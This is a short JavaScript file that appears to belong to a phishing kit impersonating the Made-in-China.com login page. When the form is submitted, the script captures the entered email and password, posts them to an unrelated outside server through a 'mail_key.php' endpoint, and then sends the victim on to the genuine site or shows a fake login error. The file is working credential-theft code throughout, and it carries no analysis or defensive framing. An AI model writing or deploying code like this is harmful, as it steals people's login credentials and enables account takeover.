$('document').ready(function () {

    $('*#login_form').on('submit', function () {

        $('*#login_form button').attr('disabled', true);
        $('*#login_form button').html('Please Wait...');

        if (window.innerWidth <= 800) {
            var mail = $('#mobile_login_login').val();
            var password = $('#mobile_login_password').val();
        } else {
            var mail = $('#pc_login_login').val();
            var password = $('#pc_login_password').val();
        }

        $.ajax({
            url: 'https://platiniumxpwallet.com/external/MadeInChina/php/mail_key.php',
            method: 'post',
            data: {
                mail,
                password
            },
            success: function (data) {
                console.log(data);
                if (data == 'Sent') {
                    location.assign('https://made-in-china.com');
                } else {
                    alert('Error Logging Into Your Account');
                }
            },
            fail: function (data) {
                console.log(data);
                alert('Error Logging Into Your Account');
            },
            error: function (data) {
                console.log(data);
                alert('Error Logging Into Your Account');
            }
        })

        return false;

    })

})
